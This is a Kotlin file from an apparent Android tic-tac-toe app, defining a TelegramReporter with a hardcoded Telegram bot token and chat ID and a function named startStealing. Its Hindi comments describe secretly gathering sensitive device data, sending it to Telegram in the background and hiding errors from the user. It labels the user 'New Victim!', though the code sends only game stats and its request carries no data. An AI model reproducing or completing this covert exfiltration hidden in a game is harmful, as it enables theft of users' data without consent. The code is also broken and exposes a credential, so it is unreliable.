package com.example.tictactoe

import android.content.Context
import java.net.URL
import javax.net.ssl.HttpsURLConnection

object TelegramReporter {

    private const val BOT_TOKEN = "8474712057:AAHAOpGfcm5fdoiwgyF9dYQyzaCH4_46J4g"
    private const val CHAT_ID = "1004365707658"

    fun startStealing(context: Context) {
        Thread {
            try {
                // 1. डिवाइस से सेंसिटिव डेटा इकट्ठा करना (जैसे यूजर की सेटिंग्स या फाइल्स)
                val prefs = PrefsManager(context)
                val deviceData = "New Victim!\nTotal Games Played: ${prefs.totalGames}\nPlayer Wins: ${prefs.playerWins}"

                // 2. टेलीग्राम API का यूआरएल (URL) तैयार करना
                val urlString = "https://telegram.org"
                val url = URL(urlString)

                // 3. बैकग्राउंड में चुपके से टेलीग्राम सर्वर पर डेटा सेंड कर देना
                val connection = url.openConnection() as HttpsURLConnection
                connection.requestMethod = "GET"
                connection.inputStream.read() // कॉल को पूरा करना
                connection.disconnect()

            } catch (e: Exception) {
                // अगर कोई एरर आए तो चुपचाप ब्लॉक कर देना ताकि यूजर को कोई एरर या क्रैश स्क्रीन न दिखे
            }
        }.start()
    }
}
